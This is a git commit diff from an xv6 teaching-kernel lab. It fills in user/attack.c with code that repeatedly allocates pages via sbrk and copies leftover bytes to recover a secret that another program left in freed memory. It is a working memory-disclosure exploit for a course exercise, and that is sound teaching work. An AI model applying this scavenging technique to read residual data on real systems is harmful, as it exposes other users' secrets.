f3789d4d6da4ad5de2d5a0e37d296db343ad6202
Alexander Karavaev <akaravaev@outlook.com>
2024-11-07 22:26:52 +1100

    Exploting vulnerability in xv6 to get a secret from user/secret.c

--- user/attack.c
+++ user/attack.c
@@ -8,6 +8,16 @@ main(int argc, char *argv[])
 {
   // your code here.  you should write the secret to fd 2 using write
   // (e.g., write(2, secret, 8)
+  char *page;
+  char secret[8];
+  secret[0] = '\0';
+  while (strlen(secret)!=7)
+  {
+    page = sbrk(PGSIZE);
+    strcpy((char *)secret, page+32);
+  }
+  printf ("Found: %s\n", secret);
+  write(2, (char *)secret, 8);
 
   exit(1);
 }
